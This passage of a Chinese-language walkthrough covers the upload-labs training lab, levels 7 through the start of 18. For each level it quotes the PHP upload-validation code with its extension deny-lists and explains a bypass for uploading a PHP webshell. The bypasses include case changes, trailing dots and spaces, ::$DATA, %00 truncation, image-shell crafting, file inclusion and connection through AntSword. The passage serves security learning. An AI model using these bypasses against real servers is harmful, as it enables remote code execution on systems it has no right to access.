}  这里代码和上面是一个类型的 解题思路：大小写绕过\n由以上代码可知，源码中没有==对后缀名进行统一转换为大小写==，所以在本关中，在BP拦截后，将图片马后缀名改为 Php（这么依情况而定，不段的按照图片后缀名大小写去尝试即可 ）\nPASS-07 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\u0026quot;YmdHis\u0026quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件不允许上传'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  解题思路：由源码可知，图片并没有对后缀进行去空处理，所以需要利用BP进行加空。 如下图，图片后缀为php+空格\nPASS-08 贴一下源码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  解题思路： 解题姿势一：\n加点绕过，由源码可知，图片做了==去空==处理，但是没有做==去点==处理，所以可以加点绕过。 如下图，图片后缀为php+点 或者php+点+空+点\n解题姿势二\n利用Windows解析漏洞（后缀修改为1.php:1.jpg）\n上传成功后\u0026hellip;里面的代码没了\u0026hellip;不知道为什么\u0026hellip;\nPASS-09 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\u0026quot;YmdHis\u0026quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  解题思路：\n由上可知，文件没有对后缀名进行去“::$DATA\u0026quot;， php 在 window 的时候如果文件名 + \u0026ldquo;::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持“::$DATA\u0026quot;之前的文件名 他的目的就是不检查后缀名。\nps:==只能是Windows系统，并且只能时php文件==\nPASS-10 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;.php\u0026quot;,\u0026quot;.php5\u0026quot;,\u0026quot;.php4\u0026quot;,\u0026quot;.php3\u0026quot;,\u0026quot;.php2\u0026quot;,\u0026quot;.html\u0026quot;,\u0026quot;.htm\u0026quot;,\u0026quot;.phtml\u0026quot;,\u0026quot;.pht\u0026quot;,\u0026quot;.pHp\u0026quot;,\u0026quot;.pHp5\u0026quot;,\u0026quot;.pHp4\u0026quot;,\u0026quot;.pHp3\u0026quot;,\u0026quot;.pHp2\u0026quot;,\u0026quot;.Html\u0026quot;,\u0026quot;.Htm\u0026quot;,\u0026quot;.pHtml\u0026quot;,\u0026quot;.jsp\u0026quot;,\u0026quot;.jspa\u0026quot;,\u0026quot;.jspx\u0026quot;,\u0026quot;.jsw\u0026quot;,\u0026quot;.jsv\u0026quot;,\u0026quot;.jspf\u0026quot;,\u0026quot;.jtml\u0026quot;,\u0026quot;.jSp\u0026quot;,\u0026quot;.jSpx\u0026quot;,\u0026quot;.jSpa\u0026quot;,\u0026quot;.jSw\u0026quot;,\u0026quot;.jSv\u0026quot;,\u0026quot;.jSpf\u0026quot;,\u0026quot;.jHtml\u0026quot;,\u0026quot;.asp\u0026quot;,\u0026quot;.aspx\u0026quot;,\u0026quot;.asa\u0026quot;,\u0026quot;.asax\u0026quot;,\u0026quot;.ascx\u0026quot;,\u0026quot;.ashx\u0026quot;,\u0026quot;.asmx\u0026quot;,\u0026quot;.cer\u0026quot;,\u0026quot;.aSp\u0026quot;,\u0026quot;.aSpx\u0026quot;,\u0026quot;.aSa\u0026quot;,\u0026quot;.aSax\u0026quot;,\u0026quot;.aScx\u0026quot;,\u0026quot;.aShx\u0026quot;,\u0026quot;.aSmx\u0026quot;,\u0026quot;.cEr\u0026quot;,\u0026quot;.sWf\u0026quot;,\u0026quot;.swf\u0026quot;,\u0026quot;.htaccess\u0026quot;,\u0026quot;.ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = '此文件类型不允许上传！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  解题思路： ==将filename拼接路径会带来极大风险==，由$img_path = UPLOAD_PATH.'/'.$file_name;可知，该关进行的是现在文件末尾先去点，再去空便没有再做任何处理，因此我们可以利用这个漏洞，上传图片马，然后用BP,构造后缀名为php+点+空+点\nPASS-11 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\u0026quot;php\u0026quot;,\u0026quot;php5\u0026quot;,\u0026quot;php4\u0026quot;,\u0026quot;php3\u0026quot;,\u0026quot;php2\u0026quot;,\u0026quot;html\u0026quot;,\u0026quot;htm\u0026quot;,\u0026quot;phtml\u0026quot;,\u0026quot;pht\u0026quot;,\u0026quot;jsp\u0026quot;,\u0026quot;jspa\u0026quot;,\u0026quot;jspx\u0026quot;,\u0026quot;jsw\u0026quot;,\u0026quot;jsv\u0026quot;,\u0026quot;jspf\u0026quot;,\u0026quot;jtml\u0026quot;,\u0026quot;asp\u0026quot;,\u0026quot;aspx\u0026quot;,\u0026quot;asa\u0026quot;,\u0026quot;asax\u0026quot;,\u0026quot;ascx\u0026quot;,\u0026quot;ashx\u0026quot;,\u0026quot;asmx\u0026quot;,\u0026quot;cer\u0026quot;,\u0026quot;swf\u0026quot;,\u0026quot;htaccess\u0026quot;,\u0026quot;ini\u0026quot;); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\u0026quot;\u0026quot;, $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = '上传出错！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } }  解题思路：\nstr_ireplace函数：替换上述文件后缀名为空，但是他只是进行了一次替换，没有多次，所以我们可以通过双写进行绕过 （对大小写不敏感）\nPass12-13:将filename加入最终路径会带来极大风险 get和post方法提交：\n  get请求: 请求的数据会附加在url之后并且以？分隔url和传输的数据，多个参数之间用\u0026amp;连接， 会在URI中暴露出来 ；\n  post请求： 把提交的数据放置在http包的包体中，以二进制流的方式进行传送，不会对%00等进行自动解码，并 不会暴露出来。\n  最后才发现原来，get和post方法在页面html源码上可以找到，并且可以发现get和post传递的相应参数（例如下面的 $save_path和 $save_name），及参数规定的值。\n  Pass-12 贴下代码：\n$is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\u0026quot;.\u0026quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = '上传出错！'; } } else{ $msg = \u0026quot;只允许上传.jpg|.png|.gif类型文件！\u0026quot;; } }  源码分析：\n$ext_arr = array('jpg','png','gif');//发现是白名单 $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\u0026quot;.\u0026quot;)+1); if(in_array($file_ext,$ext_arr)){ //储存在服务器目录的文件名称 $temp_file = $_FILES['upload_file']['tmp_name']; //随机生成文件的名称 $img_path = $_GET['save_path'].\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_ext; //函数将文件与后缀名直接进行拼接 if(move_uploaded_file($temp_file,$img_path)){  函数： substr()函数：返回字符串的一部分\n从字符串中返回 \u0026quot;world\u0026quot;： \u0026lt;?php echo substr(\u0026quot;Hello world\u0026quot;,6); ?\u0026gt; //输出world  strrpos() 函数：查找字符串在另一字符串中最后一次出现的位置。 注释：strrpos() 函数对大小写敏感。\n查找 \u0026quot;php\u0026quot; 在字符串中最后一次出现的位置： \u0026lt;?php echo strrpos(\u0026quot;You love php, I love php too!\u0026quot;,\u0026quot;php\u0026quot;); ?\u0026gt;//输出21  解题思路：\nURI中00截断\n由源码可得，在这边他直接将后缀名 $file_ext $进行拼接。如果中途在其中加入php后缀，再利用00进行截断，那么便可以将该文件当作php文件进行解析。再者又有 $_GET[‘save_path’]，这表示他需要请求 参数save_path，使用GET方法，即我们可以在拦下包的时候 在URI中发现参数 save_path，我们便可以拦下包将save_path 换掉。\n解题姿势一：\n拦包00截断\n截断条件：\n==截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态==\n由源码可知，图片的save_path通过get传递，然后和后缀ima_path直接拼接而成的，所以我们可以直接使用 %00 截断，将后缀名 .jpg 截断，从而以 php 运行。\n解题姿势二：\n前端直接修改为 \u0026ldquo;php+00截断\u0026quot;格式 如下可得，直接将参数save_path修改为php+00截断的格式，因此它会将之后上传的所有文件以PHP的格式进行解析。\n上传图片马，复制图片地址，直接蚁剑1.php即可\n附个图片的地址：http://localhost/upload-labs-master/upload/1.php%EF%BF%BD/6320200921235947.png 把php后面的删掉连接\nPASS-13 贴一下代码：\n$is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\u0026quot;.\u0026quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026quot;上传失败\u0026quot;; } } else { $msg = \u0026quot;只允许上传.jpg|.png|.gif类型文件！\u0026quot;; } }  源码分析：\n由源码可知，直接将 $file_ext 拼接在路径中，因此我们可以在中间时将php加在 $file_ext 中，从而以PHP文件解析。再由 $_POST[‘save_path’]请求可知， 参数save_path 虽然不会出现在URI中，但是我们可以在包里面发现他，因此我们可以在包里面对 $file_ext 中进行更改。但是POST是以二进制流进行发送文件，因此我们需要在封包的 二进制文件 中对 $file_ext添加php和对应的 00截断 。\n解题思路：\nPOST请求，二进制文件中00截断\n解题姿势：\n上传图片马后为如下: 然后在上面的upload 的后面加上 XXX.php+（这里的XXX可以为任何名字，他只是一个代号。并且 php后面的 + 好也是一个标记，他的二进制代码为 2b） 由上可知，将二进制中的 + 改为 00 截断，即将 + 的二进制码 2b 改为 00 .\n上传成功 注：这里蚁剑连接1.php即后面的被截断了\nPASS-14 贴一下代码:\nfunction getReailFileType($filename){ $file = fopen($filename, \u0026quot;rb\u0026quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\u0026quot;C2chars\u0026quot;, $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode){ case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown'){ $msg = \u0026quot;文件未知，上传失败！\u0026quot;; }else{ $img_path = UPLOAD_PATH.\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026quot;上传出错！\u0026quot;; } } }  函数解释：\n(1) fopen() 函数打开文件或者 URL。 如果打开失败，本函数返回 FALSE。 语法：fopen(filename,mode,include_path,context) ---------------------------------------------------- |filename |必需。规定要打开的文件或 URL。 | ---------------------------------------------------- |mode |必需。规定要求到该文件/流的访问类型。 | ---------------------------------------------------- |include_path |可选。如果也需要在 include_path 中检索 | | |文件的话，可以将该参数设为 1 或 TRUE。 | ---------------------------------------------------- |context |可选。规定文件句柄的环境。Context 是可以| | |修改流的行为的一套选项 | ---------------------------------------------------- (2) fread() 函数读取文件（可安全用于二进制文件）。 语法:fread(file,length) ------------------------------------ |file |必需。规定要读取打开文件。 | ------------------------------------ |length |必需。规定要读取的最大字节数. | ------------------------------------ (3) fclose() 函数关闭一个打开文件。 语法:fclose(file) file | 必需。规定要关闭的文件。  代码分析:\nfunction getReailFileType($filename){ $file = fopen($filename, \u0026quot;rb\u0026quot;); //rb是读取二进制文件。r表示read,即读取;b表示binary，即二进制。 $bin = fread($file, 2); //只读2字节 /*表示只是对文件头做了一个检测*/ fclose($file); $strInfo = @unpack(\u0026quot;C2chars\u0026quot;, $bin); //标识前两个字符按照，c格式，数组索引charsl、chars2 $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; //意思是：读取上传文件的前两个字节内容，unpack解码后，使用intval转换为10进制，默认为10进制，根据转换后的结果判断图片类型。  解题姿势: 1、制作图片马，在cmd中输入copy 1.jpg/b + 1.php/a 111.jpg，2.jpg就是生成的图片马。\n注:==要在1.jpg和1.php的目录下运行命令==\n2、上传成功后，jpg文件不能直接解析为php文件，这里需要利用文件包含解析图片马里的php脚本，file为我们的图片马位置\nPASS-15 贴一下代码：\nfunction isImage($filename){ $types = '.jpeg|.png|.gif'; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)\u0026gt;=0){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \u0026quot;文件未知，上传失败！\u0026quot;; }else{ $img_path = UPLOAD_PATH.\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026quot;上传出错！\u0026quot;; } } }  函数解释：\nstripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。 语法： stripos(string,find,start) ----------------------------------------- |string|必需。规定要搜索的字符串。 | ----------------------------------------- |find |必需。规定要查找的字符。 | ----------------------------------------- |start |可选。规定开始搜索的位置。 | -----------------------------------------  代码分析：\n$info = getimagesize($filename); $ext = image_type_to_extension($info[2]); // getimagesize通过检查图像文件的大小并返回图像的尺寸以及文件类型. // image_type_to_extension根据指定的图像类型返回对应的后缀名.  解题思路：\n（图片马 之 使用getimagesize()检查是否为图片文件）\n利用方式同PASS-14\n蚁剑链接成功\nPASS-16 贴一下源码：\nfunction isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return \u0026quot;gif\u0026quot;; break; case IMAGETYPE_JPEG: return \u0026quot;jpg\u0026quot;; break; case IMAGETYPE_PNG: return \u0026quot;png\u0026quot;; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res){ $msg = \u0026quot;文件未知，上传失败！\u0026quot;; }else{ $img_path = UPLOAD_PATH.\u0026quot;/\u0026quot;.rand(10, 99).date(\u0026quot;YmdHis\u0026quot;).\u0026quot;.\u0026quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026quot;上传出错！\u0026quot;; } } }  函数分析：\n 与Pass-14思路相同，上传同个图片马就可以。相关函数说明：  exif_imagetype(string $filename)//读取一个图像的第一个字节并检查其签名  注: ==此函数需要开启php_exif模块==\n这里有一个问题：\n仅仅打开这个是不行的，上传图片会出现空白的情况，如下：\n百度一番之后才知道要在php.ini中修改配置。\n在php.ini中搜索extension=php_exif.dll，然后将前面的分号去掉\n保存重启之后就能正常使用了。\n后面利用和PASS-14一样\n蚁剑连接成功\nPASS-17 贴一下代码：\n$is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\u0026quot;.\u0026quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \u0026quot;jpg\u0026quot;) \u0026amp;\u0026amp; ($filetype==\u0026quot;image/jpeg\u0026quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = \u0026quot;该文件不是jpg格式的图片！\u0026quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026quot;.jpg\u0026quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026quot;上传出错！\u0026quot;; } }else if(($fileext == \u0026quot;png\u0026quot;) \u0026amp;\u0026amp; ($filetype==\u0026quot;image/png\u0026quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = \u0026quot;该文件不是png格式的图片！\u0026quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026quot;.png\u0026quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026quot;上传出错！\u0026quot;; } }else if(($fileext == \u0026quot;gif\u0026quot;) \u0026amp;\u0026amp; ($filetype==\u0026quot;image/gif\u0026quot;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = \u0026quot;该文件不是gif格式的图片！\u0026quot;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026quot;.gif\u0026quot;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = \u0026quot;上传出错！\u0026quot;; } }else{ $msg = \u0026quot;只允许上传后缀为.jpg|.png|.gif的图片文件！\u0026quot;; } }  函数分析：\n[FILE数组内容](https://www.cnblogs.com/laijinquan/p/8682282.html)（_FILE[“file”][“tmp_name”];其中file为前台上传文件的名称，而tmp_name是包含路径的新的文件名。） $_FILES[‘myFile’][‘name’] 客户端文件的原名称。 $_FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如\u0026quot;image/gif\u0026quot;。 $_FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。 $_FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的  代码分析：\nif (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name'];/**/获得上传文件名字** $filetype = $_FILES['upload_file']['type'];//**后缀类型** $tmpname = $_FILES['upload_file']['tmp_name'];/**/临时文件名字** $target_path=UPLOAD_PATH.'/'.basename($filename);//**获得临时文件的路径的名字** // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\u0026quot;.\u0026quot;),1);/**/文件后缀** //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \u0026quot;jpg\u0026quot;) \u0026amp;\u0026amp; ($filetype==\u0026quot;image/jpeg\u0026quot;)){ if(move_uploaded_file($tmpname,$target_path)){**//将临时文件放在路径下面** //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path);//二次**渲染图片，并且检验图片是否为jpg的格式，并且返回ture或者false** if($im == false){ $msg = \u0026quot;该文件不是jpg格式的图片！\u0026quot;; @unlink($target_path);//**根据路径删除临时文件** }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\u0026quot;.jpg\u0026quot;;//**生成新图片的名字** //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename;//**生成新图片的路径** imagejpeg($im,$img_path);//**将新图片放到该路径下** @unlink($target_path);//**删除临时图片** $is_upload = true; } } else { $msg = \u0026quot;上传出错！\u0026quot;; }  验证过程： 判断后缀与MIME类型是否符合要求，符合后生成新图像（内容不正确会失败，返回false，相当于多了一次验证），生成新图像失败就unlink删除，成功就根据系统时间给文件命名，再通过imagejpeg类似函数使用原图像资源创建新图像（二次渲染）。相关函数说明：\nbasename(string $path [,string $suffix]) //返回路径中的文件名部分 imagecreatefromjpeg(string $filename) imagecreatefrompng(string $filename) imagecreatefromgif(string $filename) //由文件或URL创建一个新图像，内容不对则失败返回false，成功后返回图像资源 srand([int $seed ]) //用seed播下随机数发生器种子 strval(mixed $var) //返回字符串类型的var imagejpeg(resource $image [,string $filename [,int $quality]])//从image图像以filename为文件名创建一个JPEG图像 imagepng(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个PNG图像或文件 imagegif(resource $image [,string $filename]) //从 image 图像以filename为文件名创建一个GIF图像或文件  解题姿势：\n在相同位置中添加一句话木马后发现，这次没有消失\n利用文件包含漏洞，蚁剑连接\n这里只上传了gif文件，jpg和png有点复杂，暂时还没有弄懂\u0026hellip;\n附个大佬博客链接，有详解：https://xz.aliyun.com/t/2657\nPASS-18 贴一下源码：\n$is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\u0026quot;.\u0026quot;)+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 